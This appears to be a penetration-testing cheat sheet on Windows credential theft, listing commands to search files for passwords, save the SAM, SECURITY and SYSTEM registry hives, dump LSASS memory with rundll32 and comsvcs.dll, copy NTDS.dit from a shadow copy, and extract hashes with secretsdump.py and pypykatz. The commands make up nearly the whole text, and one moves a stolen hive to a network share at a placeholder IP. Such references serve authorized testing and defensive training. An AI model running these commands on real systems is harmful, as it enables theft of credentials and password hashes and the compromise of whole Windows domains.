# Password Hunting

## Search for the string "Password" in many different file type

`findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

Search for the string cred :

`findstr /s /i cred n:*.*`

`Get-ChildItem -Recurse -Path N:\ -Include`` `_`cred`_` ``-File`

## Dump SAM (%SystemRoot%/system32/config/SAM)

Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).

`reg.exe save hklm\sam C:\sam.save`

Uses move in Windows to transfer a file to a specified file share over the network.

`move sam.save \\<IP>\\NameofFileShare`

Finally, we can use secretsdump.py to dump password hashes from  the SAM database :&#x20;

`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

## Dump LSASS

### RunDLL32

`Get-Process lsass`

Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials :&#x20;

`rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`

### Pypykatz

Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.

`pypykatz lsa minidump /path/to/lsassdumpfile`

## Dump NTDS.DIT (AD Database - %SystemRoot%/system32/config/SAM)

| Command                                                                                                  | Description                                                                                                                                 |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `vssadmin CREATE SHADOW /For=C:`                                                                         | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:` . This can be used to make a copy of NTDS.dit safely. |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:` .                                   |
